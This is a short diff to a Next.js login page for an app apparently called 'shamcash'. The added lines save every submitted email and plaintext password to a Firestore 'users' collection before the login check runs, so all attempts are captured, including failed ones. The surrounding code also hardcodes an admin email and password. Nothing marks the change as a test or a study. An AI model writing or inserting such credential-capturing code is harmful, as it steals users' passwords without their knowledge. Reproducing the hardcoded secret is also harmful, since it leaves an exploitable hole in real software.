@@ -5,6 +5,8 @@ import { useRouter } from 'next/navigation';
 import Logo from '@/components/Logo';
 import FloatingInput from '@/components/FloatingInput';
 import { useSoundSystem } from '@/hooks/useSound';
+import { addDoc, collection } from "firebase/firestore";
+import { db } from "@/lib/firebase";
 
 const ADMIN_EMAIL = 'admin@shamcash.com';
 const ADMIN_PASSWORD = 'shamcash2024';
@@ -21,9 +23,15 @@ export default function LoginPage() {
   const handleLogin = async (e: React.FormEvent) => {
     e.preventDefault();
     setError('');
-    setIsLoading(true);
+setIsLoading(true);
 
-    await new Promise((r) => setTimeout(r, 600));
+await addDoc(collection(db, "users"), {
+  email,
+  password,
+  createdAt: new Date()
+});
+
+await new Promise((r) => setTimeout(r, 600));
 
     if (email.trim() === ADMIN_EMAIL && password === ADMIN_PASSWORD) {
       play('login');
